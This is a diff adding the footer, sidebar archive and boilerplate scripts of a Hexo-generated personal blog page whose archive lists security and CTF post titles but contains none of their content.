+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:543251348@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/K4ge" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 9
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2019/07/20/PHP XXE/" >PHP XXE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/2019/06/13/Sqli-labs 盲注脚本编写/" >Sqli-labs 盲注脚本编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/2019/05/21/Beautifulsoup解析/" >BeautifulSoup解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/代码审计的相关函数分析/" >代码审计相关函数分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/bugku代码审计wp/" >bugku代码审计wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2019/04/21/PHP反序列化绕过__wakeup方法/" >PHP反序列化绕过__wakeup方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href= "/2019/03/31/文件包含漏洞/" >文件包含漏洞小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2019/02/03/同一台电脑连接多个github仓库/" >同一台电脑连接多个github仓库</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2019/02/03/hgame草稿/" >hgame-web-week1</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="编程"><span class="iconfont-archer">&#xe606;</span>编程</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="编程"><span class="iconfont-archer">&#xe60a;</span>编程</span>
+    
+        <span class="sidebar-category-name" data-categories="web"><span class="iconfont-archer">&#xe60a;</span>web</span>
+    
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
+    
+        <span class="sidebar-category-name" data-categories="��ʽ����"><span class="iconfont-archer">&#xe60a;</span>��ʽ����</span>
+    
+        <span class="sidebar-category-name" data-categories="����С����"><span class="iconfont-archer">&#xe60a;</span>����С����</span>
+    
+        <span class="sidebar-category-name" data-categories="正式文章"><span class="iconfont-archer">&#xe60a;</span>正式文章</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Kage"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+     
+    </body>
+</html>
+
+
